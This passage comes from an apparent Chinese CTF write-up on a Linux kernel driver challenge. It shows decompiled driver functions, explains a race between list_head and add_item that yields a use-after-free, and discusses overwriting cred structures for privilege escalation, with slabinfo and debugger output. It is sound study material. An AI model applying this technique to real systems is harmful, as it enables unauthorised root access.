___GFP_DIRECT_RECLAIM|___GFP_KSWAPD_RECLAIM</span></span><br><span class="line">  v2 = v7.size;</span><br><span class="line">  v3 = v7.mem;</span><br><span class="line">  v1-&gt;isuse = <span class="number">1</span>;</span><br><span class="line">  v4 = v1;</span><br><span class="line">  v1-&gt;size = v2;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;v1-&gt;buf, v3, v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(v4);</span><br><span class="line">    result = <span class="number">-22L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_lock(&amp;list_lock);</span><br><span class="line">    v5 = g_list;</span><br><span class="line">    g_list = v4;</span><br><span class="line">    v4-&gt;fd = v5;</span><br><span class="line">    mutex_unlock(&amp;list_lock);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="select-item"><a href="#select-item" class="headerlink" title="select_item"></a>select_item</h3><p>select_item函数也很简单，遍历查找第a2个内存块，然后对该块做get操作，放入(a1 + 200)位置，并对原来的堆块做puts操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">select_item</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  struct_item *v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 **v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  mutex_lock(&amp;list_lock);</span><br><span class="line">  v2 = g_list;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !g_list )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">      mutex_unlock(&amp;list_lock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-22L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">      v2 = v2-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == v3 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22L</span>L;</span><br><span class="line">  get(&amp;v2-&gt;isuse);</span><br><span class="line">  mutex_unlock(&amp;list_lock);</span><br><span class="line">  v4 = *(<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 ***)(a1 + <span class="number">200</span>);</span><br><span class="line">  mutex_lock(v4 + <span class="number">1</span>);</span><br><span class="line">  put(*v4);</span><br><span class="line">  *v4 = &amp;v2-&gt;isuse;</span><br><span class="line">  mutex_unlock(v4 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到get操作是一个原子性的加法操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">get</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _InterlockedIncrement(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而put操作是一个原子性的减法，当减为0时，把这块free掉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">put</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !_InterlockedDecrement(a1) )</span><br><span class="line">      result = kfree(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="remove-item"><a href="#remove-item" class="headerlink" title="remove_item"></a>remove_item</h3><p>remove_item也是根据用户输入的a1，顺序查找链表，当找到后从单链表上摘除，并对其做一个put操作，并不是直接的free，这是为了防止用select_item选择时，将其放到a1+200中，而造成的UAF。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">remove_item</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  struct_item *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  struct_item *v3; <span class="comment">// rdi</span></span><br><span class="line">  struct_item *v5; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    mutex_lock(&amp;list_lock);</span><br><span class="line">    <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = g_list;</span><br><span class="line">      <span class="keyword">if</span> ( g_list )</span><br><span class="line">      &#123;</span><br><span class="line">        g_list = g_list-&gt;fd;</span><br><span class="line">        put(&amp;v5-&gt;isuse);</span><br><span class="line">        mutex_unlock(&amp;list_lock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = g_list;</span><br><span class="line">    <span class="keyword">if</span> ( a1 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !g_list )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">        mutex_unlock(&amp;list_lock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = <span class="number">1L</span>L;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v2;</span><br><span class="line">        v1 = v1-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> ( a1 == v2 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v1 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = v1-&gt;fd;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1-&gt;fd = v3-&gt;fd;</span><br><span class="line">      put(&amp;v3-&gt;isuse);</span><br><span class="line">      mutex_unlock(&amp;list_lock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-22L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="list-head"><a href="#list-head" class="headerlink" title="list_head"></a>list_head</h3><p>而最后list_head中，会将第一块内存中的数据返回给用户。注意此时在copy_to_user分别调用了get和put函数，标识该块正在被操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">list_head</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  struct_item *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  mutex_lock(&amp;list_lock);</span><br><span class="line">  get(&amp;g_list-&gt;isuse);</span><br><span class="line">  v1 = g_list;</span><br><span class="line">  mutex_unlock(&amp;list_lock);</span><br><span class="line">  v2 = -(<span class="keyword">signed</span> __int64)((<span class="keyword">unsigned</span> __int64)copy_to_user(a1, v1, v1-&gt;size + <span class="number">0x18</span>) &gt;= <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  put(&amp;g_list-&gt;isuse);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="write-amp-read"><a href="#write-amp-read" class="headerlink" title="write &amp; read"></a>write &amp; read</h2><p>write和read就比较简单了，都是判断内存块中的size是否小于用户请求的大小，如果否就返回给用户数据内容。</p><p>而读取的位置正是a1+200，也就明白了，之前select_item的功能是选择read和write函数所对应操作的内存块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">list_read</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  struct_item **v5; <span class="comment">// r13</span></span><br><span class="line">  struct_item *v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  v4 = a3;</span><br><span class="line">  v5 = *(struct_item ***)(a1 + <span class="number">200</span>);</span><br><span class="line">  mutex_lock(v5 + <span class="number">1</span>);</span><br><span class="line">  v6 = *v5;</span><br><span class="line">  <span class="keyword">if</span> ( *v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6-&gt;size &lt;= v4 )</span><br><span class="line">      v4 = v6-&gt;size;</span><br><span class="line">    v7 = (<span class="keyword">signed</span> __int64)(v5 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_to_user(v3, &amp;v6-&gt;buf, v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(v7);</span><br><span class="line">      result = <span class="number">-22L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(v7);</span><br><span class="line">      result = v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_unlock(v5 + <span class="number">1</span>);</span><br><span class="line">    result = <span class="number">-22L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">list_write</span><span class="params">(__int64 a1, __int64 buf, <span class="keyword">unsigned</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  struct_item **v4; <span class="comment">// rbp</span></span><br><span class="line">  struct_item *v5; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = size;</span><br><span class="line">  v4 = *(struct_item ***)(a1 + <span class="number">200</span>);</span><br><span class="line">  mutex_lock(v4 + <span class="number">1</span>);</span><br><span class="line">  v5 = *v4;</span><br><span class="line">  <span class="keyword">if</span> ( *v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5-&gt;size &lt;= v3 )</span><br><span class="line">      v3 = v5-&gt;size;</span><br><span class="line">    v6 = copy_from_user(&amp;v5-&gt;buf, buf, v3);</span><br><span class="line">    v7 = (<span class="keyword">signed</span> __int64)(v4 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(v7);</span><br><span class="line">      result = <span class="number">-22L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(v7);</span><br><span class="line">      result = v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_unlock(v4 + <span class="number">1</span>);</span><br><span class="line">    result = <span class="number">-22L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞分析及利用"><a href="#漏洞分析及利用" class="headerlink" title="漏洞分析及利用"></a>漏洞分析及利用</h1><p>感觉逻辑挺严谨得的，好像并没有什么问题。不过这是站在单线程的考虑，我们看一下启动项run.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -cpu kvm64,+smep -kernel ./bzImage -append <span class="string">"console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr"</span> -initrd ./rootfs.cpio -nographic -m 2G -smp cores=2,threads=2,sockets=1 -monitor /dev/null -nographic</span><br></pre></td></tr></table></figure><p>发现是有两个内核、两个线程的，这样是满足内核竞争的条件的。让我们再来以多线程的角度来看看这道题。</p><p>好像发现了一点问题，在list_head函数中，put函数的操作直接是g_list-&gt;isuse，但是如果第一块不是之前打印的块呢？如果是一个新块，是否就错杀了好人？看一下是否可行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">list_head</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  struct_item *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]  mutex_lock(&amp;list_lock);</span><br><span class="line">  get(&amp;g_list-&gt;isuse);</span><br><span class="line">  v1 = g_list;</span><br><span class="line">[<span class="number">2</span>]  mutex_unlock(&amp;list_lock);</span><br><span class="line">  v2 = -(<span class="keyword">signed</span> __int64)((<span class="keyword">unsigned</span> __int64)copy_to_user(a1, v1, v1-&gt;size + <span class="number">0x18</span>) &gt;= <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">[<span class="number">3</span>]  put(&amp;g_list-&gt;isuse);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">add_item</span><span class="params">(add_opt *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">... ... </span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;v1-&gt;buf, v3, v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(v4);</span><br><span class="line">    result = <span class="number">-22L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">[<span class="number">4</span>]    mutex_lock(&amp;list_lock);</span><br><span class="line">    v5 = g_list;</span><br><span class="line">    g_list = v4;</span><br><span class="line">    v4-&gt;fd = v5;</span><br><span class="line">[<span class="number">5</span>]    mutex_unlock(&amp;list_lock);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现&amp;list_lock这个锁，在[2]处就释放了，而put操作在[3]处。</p><p>而add_item中仅要求能获得这个锁就可以插入了[4]、[5]，如此看来是完全可以做到的，利用线程间add_item和list_head竞争，可以让第一个堆块变成一个已经释放的堆块（即在一个线程的执行在[2]、[3]之间时，恰好另一个进程进入[4]）。</p><p>这样我们就通过竞争条件拿到了一个悬垂指针，而且悬垂指针的大小是任意控制的。</p><p>但是拿到这样一个指针并不好弄，针对于之前做过的题目，比如CISCN的babydriver里面的两种做法，第一种是利用申请和cred大小相同的块来UAF另一个线程的cred结构体，从而提权，但在此题行不通。</p><p>此题申请cred结构体用的是这个slab中的cred_jar内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">validate_process_creds();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">"prepare_creds() alloc %p"</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">old = task-&gt;cred;</span><br><span class="line"><span class="built_in">memcpy</span>(<span class="keyword">new</span>, old, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line"></span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br></pre></td></tr></table></figure><p>而kmalloc会根据size的大小，转换为kmalloc-xx中去申请堆块，虽然二者大小是相同的，但是存在完全的隔离。不同种类的slab是不可能交叉使用的。</p><p>而且，我想清楚这个问题以后，我重新调试了一下babydriver这题，惊讶的发现在/proc/slabinfo里居然没有cred_jar这个slab，而且192(cred大小0xa8对齐成 0xc0)的slab只有kmalloc-192、dentry、dma-kmalloc-192，而dentry是目录节点显然不是cred，这就很懵逼…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/slabinfo|grep jar</span></span><br><span class="line">/ <span class="comment"># cat /proc/slabinfo|grep 192</span></span><br><span class="line">TCP                    0      0   1920    8    4 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dentry              7731   7791    192   21    1 : tunables    0    0    0 : slabdata    371    371      0</span><br><span class="line">dma-kmalloc-8192       0      0   8192    4    8 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">dma-kmalloc-192        0      0    192   21    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">kmalloc-8192           8      8   8192    4    8 : tunables    0    0    0 : slabdata      2      2      0</span><br><span class="line">kmalloc-192         1029   1029    192   21    1 : tunables    0    0    0 : slabdata     49     49      0</span><br></pre></td></tr></table></figure><p>在prepare_creds这个函数下断点，惊讶的发现cred的分配用的就是kmalloc-192，不禁怀疑人生，这内核咋编译的，还是有别的操作，所以降低了这题的难度，有了直接UAF cred的操作….</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">   0xffffffff810a167d    mov    esi, 0x24000c0</span><br><span class="line">   0xffffffff810a1682    mov    rbp, rsp</span><br><span class="line">   0xffffffff810a1685    push   r12</span><br><span class="line">   0xffffffff810a1687    push   rbx</span><br><span class="line">   0xffffffff810a1688    mov    r12, qword ptr gs:[0xbe00]</span><br><span class="line"> ► 0xffffffff810a1691    call   0xffffffff811ea400</span><br><span class="line"> </span><br><span class="line">   0xffffffff810a1696    <span class="built_in">test</span>   rax, rax</span><br><span class="line">   0xffffffff810a1699    je     0xffffffff810a1759</span><br><span class="line"> </span><br><span class="line">   0xffffffff810a169f    mov    rbx, rax</span><br><span class="line">   0xffffffff810a16a2    mov    rax, qword ptr [r12 + 0x5f8]</span><br><span class="line">   0xffffffff810a16aa    mov    ecx, 0x15</span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0xffff880000957d98 ◂— 0x1200011</span><br><span class="line">01:0008│      0xffff880000957da0 —▸ 0xffff880007883fc0 ◂— 0x0</span><br><span class="line">02:0010│ rbp  0xffff880000957da8 —▸ 0xffff880000957dd8 —▸ 0xffff880000957eb8 —▸ 0xffff880000957f38 —▸ 0xffff880000957f48 ◂— ...</span><br><span class="line">03:0018│      0xffff880000957db0 —▸ 0xffffffff810a1a0f ◂— 0x840fc38948c08548</span><br><span class="line">04:0020│      0xffff880000957db8 —▸ 0x1b7cb50 ◂— 0x5c /* <span class="string">'\\'</span> */</span><br><span class="line">05:0028│      0xffff880000957dc0 ◂— 0x1200011</span><br><span class="line">06:0030│      0xffff880000957dc8 —▸ 0xffff880007883fc0 ◂— 0x0</span><br><span class="line">07:0038│      0xffff880000957dd0 ◂— 0x0</span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 ffffffff810a1691</span><br><span class="line">   f 1          1200011</span><br><span class="line">   f 2 